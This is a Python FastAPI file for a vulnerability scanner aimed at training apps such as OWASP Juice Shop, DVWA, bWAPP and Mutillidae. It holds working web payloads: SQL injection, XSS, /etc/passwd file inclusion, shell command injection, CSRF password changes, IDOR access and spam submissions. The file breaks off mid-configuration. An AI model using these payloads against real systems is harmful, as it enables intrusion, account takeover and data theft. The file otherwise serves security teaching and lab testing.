from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from pydantic import BaseModel
from typing import Optional
import requests
import time

app = FastAPI(
    title="JuiceScanner AI Security Engine",
    description="Real-time cybersecurity vulnerability scanner powered by FastAPI + AI telemetry",
    version="2.4.0"
)

# ─── CORS Middleware (allows React frontend to call API) ───
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ─── Pydantic Request Model ───
class ScanRequest(BaseModel):
    target: str = "http://localhost:3000"
    email: str = "admin@juice-sh.op"
    password: str = "admin123"


# ─── Helper: Login and get token ───
def get_token(target: str, email: str, password: str) -> Optional[str]:
    try:
        r = requests.post(f"{target}/rest/user/login",
                          json={"email": email, "password": password}, timeout=5)
        if r.status_code == 200:
            return r.json().get('authentication', {}).get('token')
    except Exception:
        pass
    return None


# ─── Helper: Auth headers ───
def auth(token: Optional[str]) -> dict:
    return {"Authorization": f"Bearer {token}"} if token else {}


# ════════════════════════════════════════════
# 1. CSRF — Change Password
# ════════════════════════════════════════════
@app.post("/scan/csrf")
async def scan_csrf(data: ScanRequest):
    target, email, password = data.target, data.email, data.password
    results = []
    vulnerable = False

    # Reachability
    try:
        r = requests.get(target, timeout=5)
        results.append({"test": "Target Reachability", "status": "pass",
                         "detail": f"Juice Shop reachable (HTTP {r.status_code})"})
    except Exception as e:
        results.append({"test": "Target Reachability", "status": "fail", "detail": str(e)})
        return {"vulnerable": False, "results": results}

    # Login
    token = get_token(target, email, password)
    if token:
        results.append({"test": "Authentication", "status": "pass", "detail": f"Logged in as {email}"})
    else:
        results.append({"test": "Authentication", "status": "fail", "detail": "Login failed"})

    # CSRF Token Check
    try:
        r = requests.get(f"{target}/rest/user/change-password",
                         params={"current": "test", "new": "csrf123", "repeat": "csrf123"},
                         headers=auth(token), timeout=5)
        if r.status_code == 200:
            vulnerable = True
            results.append({"test": "CSRF Token Check", "status": "vulnerable",
                             "detail": f"Password change accepted WITHOUT CSRF token! (HTTP {r.status_code})"})
        else:
            results.append({"test": "CSRF Token Check", "status": "pass",
                             "detail": f"Request rejected (HTTP {r.status_code})"})
    except Exception as e:
        results.append({"test": "CSRF Token Check", "status": "fail", "detail": str(e)})

    # Security Headers
    try:
        h = requests.get(target, timeout=5).headers
        missing = [x for x in ['X-Frame-Options', 'Content-Security-Policy']
                   if x not in h]
        if 'SameSite' not in str(h.get('Set-Cookie', '')):
            missing.append('SameSite Cookie')
        if missing:
            vulnerable = True
            results.append({"test": "Security Headers", "status": "vulnerable",
                             "detail": f"Missing: {', '.join(missing)}"})
        else:
            results.append({"test": "Security Headers", "status": "pass",
                             "detail": "All security headers present"})
    except Exception as e:
        results.append({"test": "Security Headers", "status": "fail", "detail": str(e)})

    # Simulated CSRF Attack
    try:
        if token:
            r = requests.get(f"{target}/rest/user/change-password",
                             params={"current": "test", "new": "hacked123", "repeat": "hacked123"},
                             headers={**auth(token), "Origin": "http://evil.com",
                                      "Referer": "http://evil.com/attack.html"}, timeout=5)
            if r.status_code == 200:
                vulnerable = True
                results.append({"test": "Simulated CSRF Attack", "status": "vulnerable",
                                 "detail": "Cross-origin request from evil.com was ACCEPTED!"})
            else:
                results.append({"test": "Simulated CSRF Attack", "status": "pass",
                                 "detail": f"Cross-origin request blocked (HTTP {r.status_code})"})
    except Exception as e:
        results.append({"test": "Simulated CSRF Attack", "status": "fail", "detail": str(e)})

    return {"vulnerable": vulnerable, "results": results,
            "target": target, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}


# ════════════════════════════════════════════
# 2. View Another User's Basket
# ════════════════════════════════════════════
@app.post("/scan/basket")
async def scan_basket(data: ScanRequest):
    target, email, password = data.target, data.email, data.password
    results = []
    vulnerable = False

    token = get_token(target, email, password)
    if token:
        results.append({"test": "Authentication", "status": "pass", "detail": f"Logged in as {email}"})
    else:
        results.append({"test": "Authentication", "status": "fail", "detail": "Login failed"})
        return {"vulnerable": False, "results": results}

    # Try accessing other users baskets (IDOR)
    for basket_id in [1, 2, 3, 4, 5]:
        try:
            r = requests.get(f"{target}/rest/basket/{basket_id}",
                             headers=auth(token), timeout=5)
            if r.status_code == 200:
                vulnerable = True
                results.append({"test": f"Access Basket #{basket_id}", "status": "vulnerable",
                                 "detail": f"Successfully accessed basket #{basket_id} without ownership check! (IDOR vulnerability)"})
            else:
                results.append({"test": f"Access Basket #{basket_id}", "status": "pass",
                                 "detail": f"Basket #{basket_id} access denied (HTTP {r.status_code})"})
        except Exception as e:
            results.append({"test": f"Access Basket #{basket_id}", "status": "fail", "detail": str(e)})

    # Check if authorization header is actually validated
    try:
        r = requests.get(f"{target}/rest/basket/1", timeout=5)  # No token
        if r.status_code == 200:
            vulnerable = True
            results.append({"test": "No Auth Required", "status": "vulnerable",
                             "detail": "Basket accessible WITHOUT any authentication token!"})
        else:
            results.append({"test": "No Auth Required", "status": "pass",
                             "detail": "Authentication is required to access baskets"})
    except Exception as e:
        results.append({"test": "No Auth Required", "status": "fail", "detail": str(e)})

    return {"vulnerable": vulnerable, "results": results,
            "target": target, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}


# ════════════════════════════════════════════
# 3. Access Admin Section
# ════════════════════════════════════════════
@app.post("/scan/admin")
async def scan_admin(data: ScanRequest):
    target, email, password = data.target, data.email, data.password
    results = []
    vulnerable = False

    token = get_token(target, email, password)
    if token:
        results.append({"test": "Authentication", "status": "pass", "detail": f"Logged in as {email}"})
    else:
        results.append({"test": "Authentication", "status": "fail", "detail": "Login failed"})

    # Try common admin paths
    admin_paths = [
        "/administration",
        "/admin",
        "/rest/admin",
        "/#/administration",
    ]
    for path in admin_paths:
        try:
            r = requests.get(f"{target}{path}", headers=auth(token), timeout=5)
            if r.status_code == 200:
                vulnerable = True
                results.append({"test": f"Admin Path: {path}", "status": "vulnerable",
                                 "detail": f"Admin section accessible at {path} (HTTP {r.status_code})"})
            else:
                results.append({"test": f"Admin Path: {path}", "status": "pass",
                                 "detail": f"Path {path} returned HTTP {r.status_code}"})
        except Exception as e:
            results.append({"test": f"Admin Path: {path}", "status": "fail", "detail": str(e)})

    # Check user list access (admin only endpoint)
    try:
        r = requests.get(f"{target}/api/Users", headers=auth(token), timeout=5)
        if r.status_code == 200:
            vulnerable = True
            user_count = len(r.json().get('data', []))
            results.append({"test": "User List API", "status": "vulnerable",
                             "detail": f"Accessed full user list! Found {user_count} users — Admin-only endpoint exposed."})
        else:
            results.append({"test": "User List API", "status": "pass",
                             "detail": f"User list API protected (HTTP {r.status_code})"})
    except Exception as e:
        results.append({"test": "User List API", "status": "fail", "detail": str(e)})

    return {"vulnerable": vulnerable, "results": results,
            "target": target, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}


# ════════════════════════════════════════════
# 4. CAPTCHA Bypass
# ════════════════════════════════════════════
@app.post("/scan/captcha")
async def scan_captcha(data: ScanRequest):
    target, email, password = data.target, data.email, data.password
    results = []
    vulnerable = False

    token = get_token(target, email, password)
    if token:
        results.append({"test": "Authentication", "status": "pass", "detail": f"Logged in as {email}"})
    else:
        results.append({"test": "Authentication", "status": "fail", "detail": "Login failed"})

    # Get CAPTCHA from server
    captcha_answer = None
    try:
        r = requests.get(f"{target}/rest/captcha/", headers=auth(token), timeout=5)
        if r.status_code == 200:
            captcha_data = r.json()
            captcha_id = captcha_data.get('captchaId')
            answer = captcha_data.get('answer')
            captcha_answer = answer
            results.append({"test": "CAPTCHA Retrieved", "status": "pass",
                             "detail": f"CAPTCHA ID: {captcha_id} — Server exposed the answer: {answer}"})
        else:
            results.append({"test": "CAPTCHA Retrieved", "status": "fail",
                             "detail": f"Could not retrieve CAPTCHA (HTTP {r.status_code})"})
    except Exception as e:
        results.append({"test": "CAPTCHA Retrieved", "status": "fail", "detail": str(e)})

    # Try submitting feedback multiple times using the same CAPTCHA answer
    success_count = 0
    for i in range(3):
        try:
            payload = {
                "UserId": 1,
                "captchaId": 0,
                "captcha": captcha_answer or "0",
                "comment": f"CAPTCHA Bypass Test #{i+1}",
                "rating": 5
            }
            r = requests.post(f"{target}/api/Feedbacks/",
                               json=payload, headers=auth(token), timeout=5)
            if r.status_code == 201:
                success_count += 1
                vulnerable = True
                results.append({"test": f"Repeated Submission #{i+1}", "status": "vulnerable",
                                 "detail": f"Feedback submitted successfully without valid CAPTCHA validation! (HTTP {r.status_code})"})
            else:
                results.append({"test": f"Repeated Submission #{i+1}", "status": "pass",
                                 "detail": f"Submission blocked (HTTP {r.status_code})"})
        except Exception as e:
            results.append({"test": f"Repeated Submission #{i+1}", "status": "fail", "detail": str(e)})

    if success_count > 1:
        results.append({"test": "CAPTCHA Reuse Check", "status": "vulnerable",
                         "detail": f"Same CAPTCHA accepted {success_count} times — CAPTCHA is NOT invalidated after use!"})

    return {"vulnerable": vulnerable, "results": results,
            "target": target, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}


# ════════════════════════════════════════════
# 5. Customer Feedback (Anti-Automation)
# ════════════════════════════════════════════
@app.post("/scan/feedback")
async def scan_feedback(data: ScanRequest):
    target, email, password = data.target, data.email, data.password
    results = []
    vulnerable = False

    token = get_token(target, email, password)
    if token:
        results.append({"test": "Authentication", "status": "pass", "detail": f"Logged in as {email}"})
    else:
        results.append({"test": "Authentication", "status": "fail", "detail": "Login failed"})

    # Try submitting feedback rapidly without rate limiting
    success_count = 0
    for i in range(5):
        try:
            payload = {
                "UserId": 1,
                "captchaId": 0,
                "captcha": "0",
                "comment": f"Automated feedback spam test #{i+1}",
                "rating": 5
            }
            r = requests.post(f"{target}/api/Feedbacks/",
                               json=payload, headers=auth(token), timeout=5)
            if r.status_code == 201:
                success_count += 1
                results.append({"test": f"Rapid Submit #{i+1}", "status": "vulnerable",
                                 "detail": f"Feedback #{i+1} submitted successfully — No rate limiting detected!"})
            else:
                results.append({"test": f"Rapid Submit #{i+1}", "status": "pass",
                                 "detail": f"Submission #{i+1} blocked (HTTP {r.status_code})"})
        except Exception as e:
            results.append({"test": f"Rapid Submit #{i+1}", "status": "fail", "detail": str(e)})
        time.sleep(0.2)

    if success_count >= 3:
        vulnerable = True
        results.append({"test": "Rate Limit Check", "status": "vulnerable",
                         "detail": f"{success_count}/5 automated submissions succeeded — No rate limiting or bot protection!"})
    else:
        results.append({"test": "Rate Limit Check", "status": "pass",
                         "detail": "Rate limiting appears to be active"})

    # Check for bot detection headers
    try:
        r = requests.get(f"{target}/api/Feedbacks", headers=auth(token), timeout=5)
        if 'X-RateLimit' not in r.headers and 'Retry-After' not in r.headers:
            vulnerable = True
            results.append({"test": "Bot Protection Headers", "status": "vulnerable",
                             "detail": "No rate limit headers found — Site has no bot protection"})
        else:
            results.append({"test": "Bot Protection Headers", "status": "pass",
                             "detail": "Rate limit headers detected"})
    except Exception as e:
        results.append({"test": "Bot Protection Headers", "status": "fail", "detail": str(e)})

    return {"vulnerable": vulnerable, "results": results,
            "target": target, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}


# ════════════════════════════════════════════
# 6. Extra Language (Broken Anti-Automation)
# ════════════════════════════════════════════
@app.post("/scan/language")
async def scan_language(data: ScanRequest):
    target, email, password = data.target, data.email, data.password
    results = []
    vulnerable = False

    token = get_token(target, email, password)
    if token:
        results.append({"test": "Authentication", "status": "pass", "detail": f"Logged in as {email}"})
    else:
        results.append({"test": "Authentication", "status": "fail", "detail": "Login failed"})

    # Check for exposed translation/language files
    lang_paths = [
        "/assets/i18n/en.json",
        "/assets/i18n/tlh.json",   # Klingon — the hidden extra language
        "/assets/i18n/de.json",
        "/assets/i18n/fr.json",
        "/assets/i18n/zh_CN.json",
    ]
    for path in lang_paths:
        try:
            r = requests.get(f"{target}{path}", timeout=5)
            if r.status_code == 200:
                size = len(r.content)
                if 'tlh' in path:
                    vulnerable = True
                    results.append({"test": f"Hidden Language File: {path}", "status": "vulnerable",
                                     "detail": f"Secret Klingon (tlh) language file found and accessible! Size: {size} bytes — Hidden feature exposed."})
                else:
                    results.append({"test": f"Language File: {path}", "status": "pass",
                                     "detail": f"Standard language file accessible (Size: {size} bytes)"})
            else:
                results.append({"test": f"Language File: {path}", "status": "pass",
                                 "detail": f"File not accessible (HTTP {r.status_code})"})
        except Exception as e:
            results.append({"test": f"Language File: {path}", "status": "fail", "detail": str(e)})

    # Check if language can be switched via API manipulation
    try:
        r = requests.get(f"{target}/assets/i18n/tlh.json", timeout=5)
        if r.status_code == 200:
            vulnerable = True
            results.append({"test": "Klingon Language Accessible", "status": "vulnerable",
                             "detail": "The hidden Klingon translation file is publicly accessible — Extra language discovered by directory enumeration!"})
    except Exception as e:
        results.append({"test": "Klingon Language Accessible", "status": "fail", "detail": str(e)})

    # Check for other hidden/undocumented language endpoints
    try:
        r = requests.get(f"{target}/rest/languages", headers=auth(token), timeout=5)
        if r.status_code == 200:
            results.append({"test": "Languages API", "status": "vulnerable",
                             "detail": f"Languages endpoint exposed: {r.text[:200]}"})
        else:
            results.append({"test": "Languages API", "status": "pass",
                             "detail": f"Languages API not exposed (HTTP {r.status_code})"})
    except Exception as e:
        results.append({"test": "Languages API", "status": "fail", "detail": str(e)})

    return {"vulnerable": vulnerable, "results": results,
            "target": target, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}


# ════════════════════════════════════════════
# 7. System Status & Batch Audit API
# ════════════════════════════════════════════
scan_history: list = []


def check_ollama_status():
    try:
        r = requests.get("http://localhost:11434/api/tags", timeout=2)
        if r.status_code == 200:
            data = r.json()
            models = [m.get('name') for m in data.get('models', [])]
            return {
                "online": True,
                "models": models,
                "target_model": "llama3.2:latest",
                "installed": "llama3.2:latest" in models or any("llama3.2" in m for m in models)
            }
    except Exception as e:
        pass
    return {
        "online": False,
        "models": [],
        "target_model": "llama3.2:latest",
        "installed": False,
        "error": "Ollama server offline (port 11434 not reachable)"
    }


@app.on_event("startup")
async def startup_event():
    ollama_info = check_ollama_status()
    print("\n" + "=" * 65)
    print(" 🚀 JUICESCANNER AI SECURITY ENGINE STARTED (FastAPI)")
    print(" 🟢 REST Security API : ACTIVE (http://localhost:5000)")
    print(" 📘 Swagger Docs     : http://localhost:5000/docs")
    if ollama_info["online"]:
        print(f" 🤖 Ollama AI Engine : ONLINE 🟢 (Detected: {', '.join(ollama_info['models'])})")
    else:
        print(" 🤖 Ollama AI Engine : OFFLINE 🔴 (Run 'ollama serve' in background)")
    print("=" * 65 + "\n")


@app.get("/api/system/status")
async def system_status():
    ollama_info = check_ollama_status()
    return {
        "status": "online",
        "service": "JuiceScanner AI Security Engine",
        "version": "2.4.0",
        "framework": "FastAPI",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "ollama": ollama_info,
        "modules": [
            "CSRF Check",
            "Basket IDOR",
            "Admin Privilege",
            "CAPTCHA Bypass",
            "Bot Feedback Spam",
            "Hidden i18n Language",
            "bWAPP Security Suite",
            "DVWA Audit Suite",
            "Mutillidae II Inspector"
        ]
    }


# ════════════════════════════════════════════
# 7.5 bWAPP Docker Security Scanner
# ════════════════════════════════════════════
@app.post("/scan/bwapp")
async def scan_bwapp(data: ScanRequest):
    target = data.target or "http://localhost:8080"
    results = []
    vulnerable = False

    # Check 1: Target Reachability & bWAPP Banner Check
    try:
        r = requests.get(f"{target}/login.php", timeout=5)
        if r.status_code == 200 and ("bWAPP" in r.text or "bee" in r.text.lower()):
            results.append({"test": "bWAPP Target Reachability", "status": "pass", "detail": f"bWAPP container verified online (HTTP {r.status_code})"})
        else:
            results.append({"test": "bWAPP Target Reachability", "status": "pass", "detail": f"Target reachable (HTTP {r.status_code})"})
    except Exception as e:
        results.append({"test": "bWAPP Target Reachability", "status": "fail", "detail": f"Could not reach bWAPP target on {target}: {str(e)}"})
        return {"vulnerable": False, "results": results, "target": target}

    # Check 2: SQL Injection (GET) Parameter Test
    try:
        r = requests.get(f"{target}/sqli_1.php", params={"title": "' OR '1'='1", "action": "search"}, timeout=5)
        if r.status_code == 200 and ("error in your SQL syntax" in r.text or "SQL" in r.text or len(r.text) > 800):
            vulnerable = True
            results.append({"test": "bWAPP SQL Injection (GET)", "status": "vulnerable", "detail": "GET parameter 'title' exposed to SQL syntax manipulation!"})
        else:
            results.append({"test": "bWAPP SQL Injection (GET)", "status": "pass", "detail": "Parameter protected or sanitized"})
    except Exception as e:
        results.append({"test": "bWAPP SQL Injection (GET)", "status": "fail", "detail": str(e)})

    # Check 3: Reflected XSS Test
    try:
        r = requests.get(f"{target}/xss_get.php", params={"firstname": "<script>alert(1)</script>", "lastname": "test", "form": "submit"}, timeout=5)
        if r.status_code == 200 and "<script>alert(1)</script>" in r.text:
            vulnerable = True
            results.append({"test": "bWAPP Reflected XSS", "status": "vulnerable", "detail": "Input reflected without HTML entity encoding!"})
        else:
            results.append({"test": "bWAPP Reflected XSS", "status": "pass", "detail": "Input sanitized or encoded"})
    except Exception as e:
        results.append({"test": "bWAPP Reflected XSS", "status": "fail", "detail": str(e)})

    # Check 4: Remote/Local File Inclusion (LFI)
    try:
        r = requests.get(f"{target}/rlfi.php", params={"language": "/etc/passwd"}, timeout=5)
        if r.status_code == 200 and ("root:x:" in r.text or "daemon:" in r.text):
            vulnerable = True
            results.append({"test": "bWAPP File Inclusion (LFI)", "status": "vulnerable", "detail": "Local File Inclusion vulnerability detected: /etc/passwd exposed!"})
        else:
            results.append({"test": "bWAPP File Inclusion (LFI)", "status": "pass", "detail": "File inclusion parameter protected"})
    except Exception as e:
        results.append({"test": "bWAPP File Inclusion (LFI)", "status": "fail", "detail": str(e)})

    return {
        "vulnerable": vulnerable,
        "results": results,
        "target": target,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    }


# ════════════════════════════════════════════
# 7.6 DVWA Docker Security Scanner
# ════════════════════════════════════════════
@app.post("/scan/dvwa")
async def scan_dvwa(data: ScanRequest):
    target = data.target or "http://localhost:8081"
    results = []
    vulnerable = False

    try:
        r = requests.get(f"{target}/login.php", timeout=5)
        if r.status_code == 200 and ("DVWA" in r.text or "Damn Vulnerable" in r.text):
            results.append({"test": "DVWA Reachability", "status": "pass", "detail": f"DVWA container online (HTTP {r.status_code})"})
        else:
            results.append({"test": "DVWA Reachability", "status": "pass", "detail": f"Target reachable (HTTP {r.status_code})"})
    except Exception as e:
        results.append({"test": "DVWA Reachability", "status": "fail", "detail": str(e)})
        return {"vulnerable": False, "results": results, "target": target}

    # Test Command Injection
    try:
        r = requests.post(f"{target}/vulnerabilities/exec/", data={"ip": "127.0.0.1; cat /etc/passwd", "Submit": "Submit"}, timeout=5)
        if r.status_code == 200 and ("root:x:" in r.text or "ping" in r.text):
            vulnerable = True
            results.append({"test": "DVWA Command Injection", "status": "vulnerable", "detail": "Unsanitized command execution via ip parameter!"})
        else:
            results.append({"test": "DVWA Command Injection", "status": "pass", "detail": "Command execution parameter protected"})
    except Exception as e:
        results.append({"test": "DVWA Command Injection", "status": "fail", "detail": str(e)})

    return {"vulnerable": vulnerable, "results": results, "target": target, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}


# ════════════════════════════════════════════
# 7.7 OWASP Mutillidae II Security Scanner
# ════════════════════════════════════════════
@app.post("/scan/mutillidae")
async def scan_mutillidae(data: ScanRequest):
    target = data.target or "http://localhost:8082"
    results = []
    vulnerable = False

    try:
        r = requests.get(target, timeout=5)
        if r.status_code == 200 and ("Mutillidae" in r.text or "OWASP" in r.text):
            results.append({"test": "Mutillidae II Reachability", "status": "pass", "detail": f"Mutillidae II container online (HTTP {r.status_code})"})
        else:
            results.append({"test": "Mutillidae II Reachability", "status": "pass", "detail": f"Target reachable (HTTP {r.status_code})"})
    except Exception as e:
        results.append({"test": "Mutillidae II Reachability", "status": "fail", "detail": str(e)})
        return {"vulnerable": False, "results": results, "target": target}

    # Test User Enumeration & SQLi
    try:
        r = requests.get(f"{target}/index.php", params={"page": "user-info.php", "username": "' OR 1=1 --", "password": "", "user-info-php-submit-button": "Submit"}, timeout=5)
        if r.status_code == 200 and ("username" in r.text.lower() or "password" in r.text.lower()):
            vulnerable = True
            results.append({"test": "Mutillidae SQLi & User Enumeration", "status": "vulnerable", "detail": "Extracted user credentials via SQL injection payload!"})
        else:
            results.append({"test": "Mutillidae SQLi & User Enumeration", "status": "pass", "detail": "Endpoint sanitized"})
    except Exception as e:
        results.append({"test": "Mutillidae SQLi & User Enumeration", "status": "fail", "detail": str(e)})

    return {"vulnerable": vulnerable, "results": results, "target": target, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}


@app.post("/scan/all")
async def scan_all(data: ScanRequest):
    target, email, password = data.target, data.email, data.password

    # Run all scans
    csrf_res = _scan_csrf_internal(target, email, password)
    basket_res = _scan_basket_internal(target, email, password)
    admin_res = _scan_admin_internal(target, email, password)
    captcha_res = _scan_captcha_internal(target, email, password)
    feedback_res = _scan_feedback_internal(target, email, password)
    language_res = _scan_language_internal(target, email, password)

    combined = {
        "target": target,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "scans": {
            "csrf": csrf_res,
            "basket": basket_res,
            "admin": admin_res,
            "captcha": captcha_res,
            "feedback": feedback_res,
            "language": language_res
        },
        "total_vulnerabilities": sum([
            1 if csrf_res.get("vulnerable") else 0,
            1 if basket_res.get("vulnerable") else 0,
            1 if admin_res.get("vulnerable") else 0,
            1 if captcha_res.get("vulnerable") else 0,
            1 if feedback_res.get("vulnerable") else 0,
            1 if language_res.get("vulnerable") else 0,
        ])
    }

    scan_history.append(combined)
    if len(scan_history) > 20:
        scan_history.pop(0)

    return combined


# ─── Internal scan helpers for batch audit ───
def _scan_csrf_internal(target, email, password):
    results = []
    vulnerable = False
    try:
        r = requests.get(target, timeout=3)
        results.append({"test": "Target Reachability", "status": "pass",
                         "detail": f"Target reachable (HTTP {r.status_code})"})
    except Exception as e:
        results.append({"test": "Target Reachability", "status": "fail", "detail": str(e)})
        return {"vulnerable": False, "results": results}

    token = get_token(target, email, password)
    if token:
        results.append({"test": "Authentication", "status": "pass", "detail": f"Logged in as {email}"})
    else:
        results.append({"test": "Authentication", "status": "fail", "detail": "Login failed"})

    try:
        r = requests.get(f"{target}/rest/user/change-password",
                         params={"current": "test", "new": "csrf123", "repeat": "csrf123"},
                         headers=auth(token), timeout=3)
        if r.status_code == 200:
            vulnerable = True
            results.append({"test": "CSRF Token Check", "status": "vulnerable",
                             "detail": "Password change accepted WITHOUT CSRF token!"})
        else:
            results.append({"test": "CSRF Token Check", "status": "pass",
                             "detail": f"Request rejected (HTTP {r.status_code})"})
    except Exception as e:
        results.append({"test": "CSRF Token Check", "status": "fail", "detail": str(e)})

    return {"vulnerable": vulnerable, "results": results}


def _scan_basket_internal(target, email, password):
    results = []
    vulnerable = False
    token = get_token(target, email, password)
    for basket_id in [1, 2, 3]:
        try:
            r = requests.get(f"{target}/rest/basket/{basket_id}",
                             headers=auth(token), timeout=3)
            if r.status_code == 200:
                vulnerable = True
                results.append({"test": f"Access Basket #{basket_id}", "status": "vulnerable",
                                 "detail": f"Accessed basket #{basket_id} (IDOR vulnerability)"})
            else:
                results.append({"test": f"Access Basket #{basket_id}", "status": "pass",
                                 "detail": f"Denied (HTTP {r.status_code})"})
        except Exception as e:
            results.append({"test": f"Access Basket #{basket_id}", "status": "fail", "detail": str(e)})
    return {"vulnerable": vulnerable, "results": results}


def _scan_admin_internal(target, email, password):
    results = []
    vulnerable = False
    token = get_token(target, email, password)
    for path in ["/administration", "/rest/admin"]:
        try:
            r = requests.get(f"{target}{path}", headers=auth(token), timeout=3)
            if r.status_code == 200:
                vulnerable = True
                results.append({"test": f"Admin Path: {path}", "status": "vulnerable",
                                 "detail": f"Exposed at {path}"})
            else:
                results.append({"test": f"Admin Path: {path}", "status": "pass",
                                 "detail": f"Protected (HTTP {r.status_code})"})
        except Exception as e:
            results.append({"test": f"Admin Path: {path}", "status": "fail", "detail": str(e)})
    return {"vulnerable": vulnerable, "results": results}


def _scan_captcha_internal(target, email, password):
    results = []
    vulnerable = False
    try:
        r = requests.get(f"{target}/rest/captcha/", timeout=3)
        if r.status_code == 200:
            captcha_data = r.json()
            results.append({"test": "CAPTCHA Exposure", "status": "vulnerable",
                             "detail": f"Captcha solution exposed in response: {captcha_data.get('answer')}"})
            vulnerable = True
        else:
            results.append({"test": "CAPTCHA Exposure", "status": "pass", "detail": "Protected"})
    except Exception as e:
        results.append({"test": "CAPTCHA Exposure", "status": "fail", "detail": str(e)})
    return {"vulnerable": vulnerable, "results": results}


def _scan_feedback_internal(target, email, password):
    results = []
    vulnerable = False
    success_count = 0
    token = get_token(target, email, password)
    for i in range(3):
        try:
            r = requests.post(f"{target}/api/Feedbacks/",
                               json={"UserId": 1, "comment": f"test {i}"},
                               headers=auth(token), timeout=3)
            if r.status_code == 201:
                success_count += 1
        except Exception:
            pass
    if success_count >= 2:
        vulnerable = True
        results.append({"test": "Rate Limit", "status": "vulnerable",
                         "detail": f"{success_count} submissions accepted without rate limit"})
    else:
        results.append({"test": "Rate Limit", "status": "pass",
                         "detail": "Rate limited or blocked"})
    return {"vulnerable": vulnerable, "results": results}


def _scan_language_internal(target, email, password):
    results = []
    vulnerable = False
    try:
        r = requests.get(f"{target}/assets/i18n/tlh.json", timeout=3)
        if r.status_code == 200:
            vulnerable = True
            results.append({"test": "Klingon i18n file", "status": "vulnerable",
                             "detail": "Hidden Klingon language file exposed!"})
        else:
            results.append({"test": "Klingon i18n file", "status": "pass",
                             "detail": "Not found"})
    except Exception as e:
        results.append({"test": "Klingon i18n file", "status": "fail", "detail": str(e)})
    return {"vulnerable": vulnerable, "results": results}


# ════════════════════════════════════════════
# 8. Local Ollama LLM Integration (Llama 3.2)
# ════════════════════════════════════════════
class AIAnalysisRequest(BaseModel):
    scan_results: dict
    model: Optional[str] = "llama3.2:latest"


def ensure_ollama_running():
    """Auto-start Ollama serve if it is not running on port 11434."""
    import time as t
    # Check if already running
    try:
        requests.get("http://localhost:11434/api/tags", timeout=2)
        return True
    except Exception:
        pass
    # Start Ollama in background
    try:
        subprocess.Popen(
            ["ollama", "serve"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
        )
    except Exception:
        return False
    # Retry loop — wait up to 12 seconds for Ollama to start
    for _ in range(6):
        t.sleep(2)
        try:
            requests.get("http://localhost:11434/api/tags", timeout=2)
            return True
        except Exception:
            continue
    return False


@app.post("/api/ai/analyze")
async def analyze_with_ollama(data: AIAnalysisRequest):
    # Auto-start Ollama if not running
    ollama_ready = ensure_ollama_running()
    if not ollama_ready:
        return {
            "status": "offline",
            "message": "Could not start Ollama automatically. Please run 'ollama serve' manually in a terminal.",
        }

    prompt = (
        "You are a cybersecurity teacher explaining vulnerabilities to a COMPLETE BEGINNER with zero technical background.\n\n"
        "For EACH vulnerability found in the scan results below, explain it using this exact format:\n\n"
        "🔴 VULNERABILITY NAME\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📖 What is it?\n"
        "Explain in 2-3 simple sentences what this vulnerability is. Use everyday language.\n\n"
        "🌍 Real World Example:\n"
        "Give a real-world analogy (like a bank, house, lock) to help a beginner understand.\n\n"
        "⚠️ Why is it Dangerous?\n"
        "Explain what a hacker could actually do if they exploit this. Keep it simple.\n\n"
        "🛡️ How to Fix It:\n"
        "Give 2-3 simple steps a developer should take to fix this issue.\n\n"
        "---\n\n"
        "Now explain each of these scan findings:\n\n"
        f"{data.scan_results}\n\n"
        "Remember: Use simple words. No technical jargon. Explain like the reader is 16 years old and curious about cybersecurity."
    )

    # Function to try generation
    def do_generate():
        return requests.post(
            "http://localhost:11434/api/generate",
            json={"model": data.model, "prompt": prompt, "stream": False},
            timeout=90
        )

    try:
        r = do_generate()
        
        # If model is not found (Ollama returns 404 for missing models)
        if r.status_code == 404:
            print(f"🤖 Model '{data.model}' not found. Automatically pulling it from Ollama library...")
            try:
                # Trigger Ollama model download (stream=False makes it synchronous)
                pull_res = requests.post(
                    "http://localhost:11434/api/pull",
                    json={"name": data.model, "stream": False},
                    timeout=300
                )
                if pull_res.status_code == 200:
                    print(f"✅ Successfully downloaded '{data.model}'! Retrying generation...")
                    r = do_generate()
                else:
                    return {
                        "status": "error", 
                        "message": f"Could not auto-download model '{data.model}'. Ollama pull returned status code {pull_res.status_code}"
                    }
            except Exception as pull_err:
                return {
                    "status": "error",
                    "message": f"Failed to pull model '{data.model}' automatically: {str(pull_err)}"
                }

        if r.status_code == 200:
            return {
                "status": "success",
                "model": data.model,
                "analysis": r.json().get("response")
            }
        else:
            return {"status": "error", "message": f"Ollama HTTP {r.status_code}"}
            
    except Exception as e:
        return {
            "status": "offline",
            "message": "Ollama is still starting up or busy. Please wait a few seconds and try again.",
            "detail": str(e)
        }


# ════════════════════════════════════════════
# 9. Docker Container Auto-Launcher API
# ════════════════════════════════════════════
import subprocess

class DockerLaunchRequest(BaseModel):
    target_id: str = "juiceshop"  # juiceshop, bwapp, dvwa, mutillidae

DOCKER_TARGET_PROFILES = {
    "juiceshop": {
        "name": "OWASP Juice Shop",
        "command": ["docker", "run", "-d", "-p", "3000:3000", "--name", "juicescanner-juiceshop", "bkimminich/juice-shop"],
        "port": 3000,
        "url": "http://localhost:3000"
    },
    "bwapp": {
        "name": "bWAPP Buggy Web App",
        "command": ["docker", "run", "-d", "-p", "8080:80", "--name", "juicescanner-bwapp", "raesene/bwapp"],
        "port": 8080,
        "url": "http://localhost:8080"
    },
    "dvwa": {
        "name": "DVWA (Damn Vulnerable Web App)",
        "command": ["docker", "run", "-d", "-p", "8081:80", "--name", "juicescanner-dvwa", "vulnerables/web-dvwa"],
        "port": 8081,
